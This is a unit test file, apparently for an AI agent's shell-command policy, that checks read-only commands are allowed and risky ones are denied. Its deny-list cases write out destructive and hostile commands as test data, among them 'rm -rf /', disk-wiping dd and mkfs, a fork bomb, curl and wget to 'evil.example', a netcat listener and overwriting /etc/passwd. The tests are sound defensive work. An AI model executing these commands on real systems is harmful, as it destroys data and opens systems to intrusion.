import { describe, expect, it } from "vitest";
import { evaluateCommand, isCommandAllowed } from "./policy";

describe("policy — 白名单命令放行", () => {
  it.each([
    "grep -rn TODO .",
    "rg --line-number FIXME src",
    "ls -la",
    "cat README.md",
    "find . -name '*.ts'",
    "head -n 20 file.txt",
    "wc -l src/index.ts",
    "grep -rn TODO . | sort | uniq",
  ])("放行：%s", (cmd) => {
    const d = evaluateCommand(cmd);
    expect(d.allowed).toBe(true);
    expect(isCommandAllowed(cmd)).toBe(true);
  });
});

describe("policy — 高风险命令拒绝", () => {
  it.each([
    "rm -rf /",
    "rm -rf build",
    "sudo apt-get install foo",
    "curl http://evil.example/x",
    "wget http://evil.example/x",
    "nc -l 4444",
    "ssh user@host",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda",
    ":(){ :|:& };:",
    "chmod 777 /etc",
    "kill -9 1",
  ])("拒绝：%s", (cmd) => {
    const d = evaluateCommand(cmd);
    expect(d.allowed).toBe(false);
    expect(d.reason).toBeTruthy();
  });
});

describe("policy — 命令链中任一段高风险即拒绝", () => {
  it("白名单命令 && 高风险命令 → 拒绝", () => {
    expect(evaluateCommand("grep -rn TODO . && rm -rf build").allowed).toBe(
      false,
    );
  });
  it("管道中混入未白名单命令 → 拒绝", () => {
    expect(evaluateCommand("cat f | node -e 'x'").allowed).toBe(false);
  });
});

describe("policy — 非白名单可执行文件拒绝", () => {
  it.each(["node script.js", "python app.py", "bash -c ls", "npm install"])(
    "拒绝非白名单：%s",
    (cmd) => {
      const d = evaluateCommand(cmd);
      expect(d.allowed).toBe(false);
      expect(d.reason).toMatch(/whitelist|allowlist|白名单/i);
    },
  );
});

describe("policy — 重定向 / 命令替换拒绝（应改用 write_file 工具）", () => {
  it.each([
    "echo hi > /etc/passwd",
    "grep -rn TODO . > report.md",
    "cat a >> b",
    "echo $(whoami)",
    "echo `whoami`",
  ])("拒绝：%s", (cmd) => {
    expect(evaluateCommand(cmd).allowed).toBe(false);
  });
});

describe("policy — 边界", () => {
  it("空命令拒绝", () => {
    expect(evaluateCommand("").allowed).toBe(false);
    expect(evaluateCommand("   ").allowed).toBe(false);
  });
  it("环境变量前缀不影响白名单判定（仍看真正的可执行文件）", () => {
    expect(evaluateCommand("LANG=C grep TODO .").allowed).toBe(true);
    expect(evaluateCommand("FOO=bar rm -rf x").allowed).toBe(false);
  });
});
